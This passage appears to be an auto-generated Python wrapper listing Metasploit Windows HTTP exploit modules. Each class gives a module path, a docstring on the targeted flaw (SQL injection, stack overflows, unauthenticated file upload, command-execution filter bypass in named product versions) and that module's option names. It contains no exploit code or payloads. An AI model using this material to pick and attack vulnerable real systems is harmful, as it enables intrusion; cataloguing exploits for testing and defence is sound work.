			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_RPORT_REMOTING = 'RPORT_REMOTING'
			required_SLEEP = 'SLEEP'
			required_TARGETURI = 'TARGETURI'

	class windows_http_sonicwall_scrutinizer_sqli(object):
		"""
		
          This module exploits a vulnerability found in Dell SonicWall Scrutinizer.
        While handling the 'q' parameter, the PHP application does not properly filter
        the user-supplied data, which can be manipulated to inject SQL commands, and
        then gain remote code execution.  Please note that authentication is NOT needed
        to exploit this vulnerability.
      
		"""

		path = 'windows/http/sonicwall_scrutinizer_sqli'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_TARGETURI = 'TARGETURI'
			required_HTMLDIR = 'HTMLDIR'

	class windows_http_hp_nnm_ovas(object):
		"""
		
          This module exploits a stack buffer overflow in HP OpenView Network Node Manager versions 7.53 and earlier.
        Specifically this vulnerability is caused by a failure to properly handle user supplied input within the
        HTTP request including headers and the actual URL GET request.

        Exploitation is tricky due to character restrictions. It was necessary to utilize a egghunter shellcode
        which was alphanumeric encoded by muts in the original exploit.

        If you plan on using exploit this for a remote shell, you will likely want to migrate to a different process
        as soon as possible. Any connections get reset after a short period of time. This is probably some timeout
        handling code that causes this.
      
		"""

		path = 'windows/http/hp_nnm_ovas'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			required_UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_sapdb_webtools(object):
		"""
		
          This module exploits a stack buffer overflow in SAP DB 7.4 WebTools.
        By sending an overly long GET request, it may be possible for
        an attacker to execute arbitrary code.
      
		"""

		path = 'windows/http/sapdb_webtools'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_desktopcentral_statusupdate_upload(object):
		"""
		
        This module exploits an arbitrary file upload vulnerability in ManageEngine DesktopCentral
        v7 to v9 build 90054 (including the MSP versions).
        A malicious user can upload a JSP file into the web root without authentication, leading to
        arbitrary code execution as SYSTEM. Some early builds of version 7 are not exploitable as
        they do not ship with a bundled Java compiler.
      
		"""

		path = 'windows/http/desktopcentral_statusupdate_upload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'

	class windows_http_hp_power_manager_filename(object):
		"""
		
          This module exploits a buffer overflow in HP Power Manager's 'formExportDataLogs'.
        By creating a malformed request specifically for the fileName parameter, a stack-based
        buffer overflow occurs due to a long error message (which contains the fileName),
        which may result aribitrary remote code execution under the context of 'SYSTEM'.
      
		"""

		path = 'windows/http/hp_power_manager_filename'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_ca_igateway_debug(object):
		"""
		
          This module exploits a vulnerability in the Computer Associates
        iTechnology iGateway component. When <Debug>True</Debug> is enabled
        in igateway.conf (non-default), it is possible to overwrite the stack
        and execute code remotely. This module works best with Ordinal payloads.
      
		"""

		path = 'windows/http/ca_igateway_debug'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_hp_nnm_snmpviewer_actapp(object):
		"""
		
          This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53
        prior to NNM_01203. By making a specially crafted HTTP request to the "snmpviewer.exe"
        CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary
        code.

        The vulnerable code lies within the a function within "snmpviewer.exe" with a
        timestamp prior to April 7th, 2010. This vulnerability is triggerable via either a GET
        or POST request. The request must contain 'act' and 'app' parameters which, when
        combined, total more than the 1024 byte stack buffer can hold.

        It is important to note that this vulnerability must be exploited by overwriting SEH.
        While the saved return address can be smashed, a function call that occurs before
        the function returns calls "exit".
      
		"""

		path = 'windows/http/hp_nnm_snmpviewer_actapp'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_peercast_url(object):
		"""
		
          This module exploits a stack buffer overflow in PeerCast <= v0.1216.
        The vulnerability is caused due to a boundary error within the
        handling of URL parameters.
      
		"""

		path = 'windows/http/peercast_url'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_http_diskboss_get_bof(object):
		"""
		
          This module exploits a stack-based buffer overflow vulnerability
        in the web interface of DiskBoss Enterprise v7.5.12 and v7.4.28,
        caused by improper bounds checking of the request path in HTTP GET
        requests sent to the built-in web server. This module has been
        tested successfully on Windows XP SP3 and Windows 7 SP1.
      
		"""

		path = 'windows/http/diskboss_get_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			DynamicSehRecord = 'DynamicSehRecord'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_rejetto_hfs_exec(object):
		"""
		
        Rejetto HttpFileServer (HFS) is vulnerable to remote command execution attack due to a
        poor regex in the file ParserLib.pas. This module exploits the HFS scripting commands by
        using '%00' to bypass the filtering. This module has been tested successfully on HFS 2.3b
        over Windows XP SP3, Windows 7 SP1 and Windows 8.
      
		"""

		path = 'windows/http/rejetto_hfs_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			required_TARGETURI = 'TARGETURI'
			HTTPDELAY = 'HTTPDELAY'

	class windows_http_apache_modjk_overflow(object):
		"""
		
          This is a stack buffer overflow exploit for mod_jk 1.2.20.
        Should work on any Win32 OS.
      
		"""

		path = 'windows/http/apache_modjk_overflow'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_ultraminihttp_bof(object):
		"""
		
          This module exploits a stack based buffer overflow in Ultra Mini HTTPD 1.21,
        allowing remote attackers to execute arbitrary code via a long resource name in an HTTP
        request. This exploit has to deal with the fact that the application's request handler
        thread is terminated after 60 seconds by a "monitor" thread. To do this, it allocates
        some RWX memory, copies the payload to it and creates another thread. When done, it
        terminates the current thread so that it doesn't crash and hence doesn't bring down
        the process with it.
      
		"""

		path = 'windows/http/ultraminihttp_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
